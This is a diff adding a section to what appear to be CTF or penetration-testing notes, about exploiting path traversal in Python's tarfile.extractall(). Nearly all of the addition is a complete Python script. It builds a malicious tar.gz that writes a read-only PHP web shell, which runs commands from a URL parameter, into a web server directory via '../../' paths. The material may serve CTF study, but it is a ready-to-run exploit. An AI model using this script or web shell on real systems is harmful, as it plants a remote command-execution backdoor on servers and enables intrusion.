@@ -1194,6 +1194,29 @@ print('[*] flag:', flag)
 
 -----------------
 
+### Creating malicious tar.gz to exploit tarfile.extractall()
+
+------------------
+
+- Function `tarfile.extractall()` is vulnerable to path traversal which can be used to overwrite files.
+- Code-:
+
+```python3
+#! /usr/bin/env python3
+import tarfile
+import io
+
+tar = tarfile.TarFile.open('malicious.tar.gz', 'w:gz')
+
+info = tarfile.TarInfo("../../var/www/html/databases/shell.php")
+info.mode=0o444 # So it cannot be overwritten
+php_shell = b"<?php echo system($_GET['cmd']); ?>"
+info.size=len(php_shell)
+tar.addfile(info,io.BytesIO(php_shell))
+tar.close()
+```
+
+----------------
 
 
 
